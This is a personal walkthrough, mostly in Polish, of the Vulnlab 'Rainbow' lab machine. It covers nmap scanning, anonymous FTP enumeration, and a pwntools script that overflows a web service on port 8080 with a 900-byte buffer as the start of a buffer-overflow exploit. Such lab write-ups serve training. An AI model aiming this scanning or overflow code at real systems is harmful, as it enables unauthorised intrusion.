# Rainbow
Windows, Medium, create by **xct**

```
sudo nmap -sU -Pn -A -F -v -oA nmaUDP --max-rate 1500 10.10.89.13
nmap -Pn -v -p- --version-all -oA nmapFULL --max-rate 1500 -A 10.10.89.13 
```
```
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 01-18-22  08:22AM                  258 dev.txt
| 01-18-22  08:30AM                54784 rainbow.exe
| 01-16-22  01:34PM                  479 restart.ps1
|_01-16-22  12:14PM       <DIR>          wwwroot
80/tcp    open  http               Microsoft IIS httpd 10.0
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http-proxy
49666/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know 
```

z 80 portu 0 info z content discovery
- dobra idę na to ftp bo aż krzyczy.

![{35FBD93B-0AC4-4A86-95C2-6B2F92A25DDD}](https://github.com/user-attachments/assets/7002c34d-ce71-45ba-9903-bd3406eaf243)

a write na wwwroot pewnie będzie i ez shell.

jeszcze szybkie czytanie

![{F916A1AE-093C-4EC2-82EF-0532E8B86E65}](https://github.com/user-attachments/assets/a611e4a6-5e1e-433c-a0ae-14b918fae2dd)

![{18583290-F20D-400D-BE7D-F2F1DDDC72C6}](https://github.com/user-attachments/assets/1f31aa72-9a0c-4272-9c12-740a5cd56d53)

oho it isn't wwwroot. So we need check the .exe

![{678539DC-5A7B-4C87-84DD-AAD3B5815521}](https://github.com/user-attachments/assets/bf5131b4-2186-42bd-bfdc-6efbf7140652)

i kurczę to nie jest .net.... może przeanalizuję co tam siedzi w tym ps1 dokładnie.

ech.. ja się męcze, a wystarczy wejść na [https://wiki.vulnlab.com/guidance/medium/rainbow](https://wiki.vulnlab.com/guidance/medium/rainbow), żeby się dowiedzieć, że marnuję czas ;)

![{71E16BFB-AC8C-4016-A141-299122759AEE}](https://github.com/user-attachments/assets/d01c37e3-271a-4141-a44f-03ff30e66b08)

```
#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system
  
HOST = b""
PORT = 8080
 
buffer = b"A"*900
content = buffer
payload =  b"POST / HTTP/1.1\r\n"
payload += b"Host: %s\r\n" % HOST
payload += b"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(content)
payload += content

p = remote(HOST, PORT)
p.send(payload)
p.close()
```
- przypadek w sumie prawie 1:1 jak miałem na oscp swoim.
I went back to the source I used then as well as I use whenever I need to make a BoF [https://tryhackme.com/r/room/bufferoverflowprep](https://tryhackme.com/r/room/bufferoverflowprep)


